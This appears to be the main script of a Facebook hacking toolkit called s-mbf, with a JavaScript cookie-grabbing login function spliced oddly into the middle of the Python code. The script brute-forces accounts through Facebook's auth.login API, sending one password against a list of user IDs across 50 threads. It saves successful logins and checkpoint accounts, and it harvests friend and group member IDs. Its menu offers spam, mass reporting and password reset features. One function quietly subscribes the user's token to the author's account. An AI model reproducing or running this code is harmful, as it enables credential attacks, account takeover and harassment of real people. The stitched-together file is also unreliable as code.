#!usr/bin/python3.7
#Author: KANG-NEWBIE ©2019
#contact: t.me/kang_nuubi
#github: github.com/kang-newbie
try:
	from multiprocessing.pool import ThreadPool
	from crayons import *
	from src import DOS
	from prompt_toolkit import prompt
	import os, requests, sys, json, time, hashlib, random, shutil
except Exception as F:
	exit("[ModuleErr] %s"%(F))

if sys.version[0] in '2':
	exit("[sorry] use python version 3")

#remove cache
try:
	shutil.rmtree("src/__pycache__")
except: pass

#banner
def banner():
	print(cyan('   _____ __  ______  ____',bold=True))
	print(cyan('  / __(_)  |/  / _ )/ __/ ',bold=True),green('Author : KANG-NEWBIE',bold=True))
	print(cyan(' _\ \/ / /|_/ / _  / _/	  ',bold=True),green('Contact: t.me/kang_nuubi',bold=True))
	print(cyan('/___/_/_/  /_/____/_/     ',bold=True),green('version:',bold=True),cyan('2.7',bold=True))

 const qs = require('querystring');
const axios = require('axios-proxy-fix');
const uuid = require('uuid/v4');
const utils = require('./utils');

async function getCookies(email, password) {
  const sim = utils.randBetween(2e4, 4e4);
  let deviceID = uuid();
  let adID = uuid();
  let formData = {
    adid: adID,
    format: 'json',
    device_id: deviceID,
    email: email,
    password: password,
    cpl: 'true',
    family_device_id: deviceID,
    credentials_type: 'device_based_login_password',
    generate_session_cookies: '1',
    error_detail_type: 'button_with_disabled',
    source: 'device_based_login',
    machine_id: utils.randString(24),
    meta_inf_fbmeta: '',
    advertiser_id: adID,
    currently_logged_in_userid: '0',
    locale: 'en_US',
    client_country_code: 'US',
    method: 'auth.login',
    fb_api_req_friendly_name: 'authenticate',
    fb_api_caller_class: 'com.facebook.account.login.protocol.Fb4aAuthHandler',
    api_key: '882a8490361da98702bf97a021ddc14d'
  };
  formData.sig = getSig(utils.sortObj(formData));
  let conf = {
    url: 'https://b-api.facebook.com/method/auth.login',
    method: 'post',
    data: formData,
    transformRequest: [
      function(data, headers) {
        return qs.stringify(data);
      }
    ],
    headers: {
      'x-fb-connection-bandwidth': utils.randBetween(2e7, 3e7),
      'x-fb-sim-hni': sim,
      'x-fb-net-hni': sim,
      'x-fb-connection-quality': 'EXCELLENT',
      'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
      'user-agent':
        'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
      'content-type': 'application/x-www-form-urlencoded',
      'x-fb-http-engine': 'Liger'
    }
  };
  const resp = await axios(conf);
  return resp.data;
}

function getSig(formData) {
  let sig = '';
  Object.keys(formData).forEach(function(key) {
    sig += `${key}=${formData[key]}`;
  });
  sig = utils.md5(sig + '62f8ce9f74b12f84c123cc23437a4a32');
  return sig;
}

module.exports = getCookies

def getFid():
	banner()
	try:
		os.mkdir('dump')
	except OSError: pass
	try:
		id=input("\n[in] your friends id: ")
		b=open('dump/friends_'+id+'_id.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
		s=json.loads(re.text)
		for i in s['friends']['data']:
			b.write(i['id'] + '\n')
			print('\r[*] %s retrieved	'%(i['id']), end=''),;sys.stdout.flush();time.sleep(0.0001)
		print('\n[!] all friends id successfuly retreived')
		print("[!] file saved: dump/friends_%s_id.txt"%(id))
		b.close()
		exit()
	except (KeyboardInterrupt,EOFError):
		exit("[!] Key interrupt: Stoped.")
	except KeyError:
		os.remove('dump/friends_'+str(id)+'_id.txt')
		exit('[!] failed to fetch friend id')

def getGid():
	banner()
	gid=input("\n[in] your groups id: ")
	try:
		os.mkdir('dump')
	except OSError: pass
	class dumps:
		def __init__(self):
			self.req=requests.Session()
			self.b=open('dump/group_'+gid+'_id.txt','w')
			self.dum(f"https://graph.facebook.com/{gid}/members?fields=id&access_token={str(toket)}")
		
		def dum(self,idi):
			self.re=self.req.get(idi).json()
			for i in self.re['data']:
				self.b.write(i['id'] + '\n')
				c=open('dump/group_'+gid+'_id.txt').readlines()
				print('\r[%s] %s retrieved'%(len(c),i['id']),end='')

			try:
				self.dum(self.re["paging"]["next"])
			except KeyError: pass
	try:			
		dumps()
		of=open('dump/group_'+gid+'_id.txt','r').readlines()
		if len(of) > 0:
			print('\n[!] all group id successfuly retreived')
			print("[!] file saved: dump/group_%s_id.txt"%(gid))
		else:
			print('\n[!] failed retreived groups id')
	except (KeyboardInterrupt,EOFError):
		exit("\n[!] Key interrupt: Stoped.")

def rmtoken():
	print("""
	[ REMOVE TOKEN/COOKIES ]

1. remove access token
2. remove cookies
3. remove access token & cookies
""")
	pilihan=int(input("/kang-newbie_> "))
	if pilihan == 1:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			os.remove('toket/token.txt')
			exit("[!] success removed access token")
		else: exit("[!] wrong input: exit")
	elif pilihan == 2:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			try:
				os.remove('toket/kue.txt')
			except FileNotFoundError: exit("[?] cookies not found")
			exit("[!] success removed cookies")
		else: exit("[!] wrong input: exit")
	elif pilihan == 3:
		ques=input("\n[?] are you sure (y/n) ")
		if ques == 'n' or ques == 'N':
			exit("[!] Canceling")
		elif ques == 'y' or ques == 'Y':
			os.remove('toket/token.txt')
			os.remove('toket/kue.txt')
			exit("[!] success removed access token & cookies")
		else: exit("[!] wrong input: exit")
	else: exit("[exit] wrong input")

def update():
	bd=input('[!?] Backup important folder (like: result, checker, and toket) (y/n) ')
	if bd == 'y' or bd == 'Y':
		import src.Backdir
	print("[!] updating...")
	if os.name in ['nt','win32']:
		os.system('cd .. & rd /s/q s-mbf')
		os.system('cd .. & git clone https://github.com/KANG-NEWBIE/s-mbf')
		exit()	
	else:
		os.system('cd ..;rm -rf s-mbf')
		os.system('cd ..;git clone https://github.com/KANG-NEWBIE/s-mbf')
		exit()

cek=[]
tap=[]
crk=[]
def main(arg):
        try:
                data={'user':arg,'pw':pas}
                req=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                js=json.loads(req.text)
                if 'access_token' in js.keys():
                        true='yeah'
                        live="%s|%s"%(arg,pas)
                        tap.append(true)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        tulis="{}\n".format(live)
                        f=open('result/found.txt','a')
                        f.write(tulis)
                        f.close()
                        for i in open('result/found.txt','r').read().splitlines()[-1:]: print("\r\033[92m[FOUND]\033[97m %s               "%(i))
                elif 'User must verify their account on www.facebook.com (405)' in js['error_msg']:
                        true='notbad'
                        cek.append(true)
                        CP="%s|%s"%(arg,pas)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        wrt="{}\n".format(CP)
                        f=open('result/cek.txt','a')
                        f.write(wrt)
                        f.close()
                        for i in open('result/cek.txt','r').read().splitlines()[-1:]: print("\r\033[93m[CHECKPOINT]\033[97m %s               "%(i))
                crk.append(arg)
                print("\r[ CRACK ] >> %s/%s F[%s] CP[%s] <<"%(len(crk),len(o),len(tap),len(cek)),end=''),;sys.stdout.flush()
        except: pass

DOS.Dos()
banner()
try:
	toket=open('toket/token.txt','r').read()
	nam=requests.get('https://graph.facebook.com/me/?access_token='+toket)
	name=nam.json()['name']

	upver='v.2.7'
	requp=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
	if upver in str(requp):
		print(yellow('\nNew version available. update your s-mbf now!'))
except KeyError:
	print("\n[Warning] access token invalid. type '6' to remove access token")
except requests.exceptions.RequestException:
	exit("\n[Err] Check your internet connection")
try:
	print(white('\t[ Welcome'),yellow(name,bold=True),white(']'))
	print("""
[01]> Simple multi bruteforce facebook
[02]> Auto multi bruteforce facebook
[03]> Dump id from your friends
[04]> Dump id from your group
[05]> Dump id with search name
[06]> Remove access token/cookies
[07]> Accept/delete all friends requests
[08]> Add friends from target id
[09]> React comments target
[10]> Home comments
[11]> Group comment
[12]> Comments target
[13]> Auto unfriends
[14]> Auto reactions
[15]> Auto follow
[16]> Chat spammer
[17]> Auto posting status
[18]> Auto Reporting
[19]> Dump email
[20]> Check bind apps
[21]> Deleted post
[22]> Checker accounts
[23]> Leave all groups
[24]> Auto reset password
[25]> Delete all messages
[26]> Download all messages image
[27]> Auto untag all posts
[00]> Check update""")
except (KeyError,NameError): pass

pilih=int(input('\n[#] kang-newbie/> '))
DOS.Dos()
if pilih == 2:
	import src.Abrute
	exit()
elif pilih == 3:
	getFid()
elif pilih == 4:
	getGid()
	exit()
elif pilih == 5:
	import src.DumpS
	exit()
elif pilih == 6:
	rmtoken()
elif pilih == 7:
	import src.Facc
	exit()
elif pilih == 8:
	import src.Fadd
	exit()
elif pilih == 9:
	import src.Kreact
	exit()
elif pilih == 10:
	import src.komen
	exit()
elif pilih == 11:
	import src.Gkomen
	exit()
elif pilih == 12:
	print("""
	;;;;;;;;;;;;;;;;;;;
	; Comments Target ;
	;;;;;;;;;;;;;;;;;;;

1. old comment target
2. new comment target
""")
	ch=int(input('[/] kang-newbie> '))
	if ch == 1:
		import src.Tkomen
	elif ch == 2:
		import src.Tkomen2
	exit()
elif pilih == 13:
	import src.Unf
	exit()
elif pilih == 14:
	input("[info] before use this module you must have a lot accounts [press enter to continue]")
	import src.Mreact
	exit()
elif pilih == 15:
	input("[Info] before use this module you must have a lot accounts [press enter]")
	import src.Asubs
	exit()
elif pilih == 16:
	import src.Cspam
	exit()
elif pilih == 17:
	import src.Apost
	exit()
elif pilih == 18:
	import src.Mreport
	exit()
elif pilih == 19:
	import src.Edump
	exit()
elif pilih == 20:
	import src.Capp
	exit()
elif pilih == 21:
	import src.Delpos
	exit()
elif pilih == 22:
	import src.Cekun
	exit()
elif pilih == 23:
	import src.Lgrup
	exit()
elif pilih == 24:
	import src.Rpass
	exit()
elif pilih == 25:
	import src.Delmsg
	exit()
elif pilih == 26:
	import src.Fmsgdl
	exit()
elif pilih == 27:
	import src.Untag
	exit()
elif pilih == 0:
	print("\n[!] Checking update")
	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
	if upver in str(rr):
		update()
	else: exit("[!] already up to date")
else:
	banner()

try:
        file=open(input("\n[in] Id List Target: ")).read().splitlines()
        pas=input("[in] Password to Crack: ")
except (KeyboardInterrupt,EOFError):
        exit(red("\n[!] Key interrupt: Exiting."))
except FileNotFoundError:
        exit(red("\n[!] File not found: Exiting."))

o=[]
for x in file:
    o.append(x)
print(cyan('\n[ Cracking',bold=True),green(len(o),bold=True),cyan('ID With Password',bold=True),yellow(pas,bold=True),cyan(']',bold=True))
p=ThreadPool(50)
next=p.map(main,o)

if len(file) == 0:
	exit("%s[!] File empty\n"%(r))
if 'yeah' in str(tap) or 'notbad' in str(cek):
        print("\n\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
else: print(f"\n[ {yellow(':(',bold=True)} ] nothing found")
if len(tap) > 0:
	print("FOUND:")
	print("="*30)
	for i in open('result/found.txt','r').read().splitlines()[-+len(tap):]: print(i)
	print("="*30)
	print("found result saved: result/found.txt")
if len(cek) > 0:
	print("\nCHCEKPOINT:")
	print("="*30)
	for i in open('result/cek.txt','r').read().splitlines()[-+len(cek):]: print(i)
	print("="*30)
	print("check result saved: result/cek.txt")
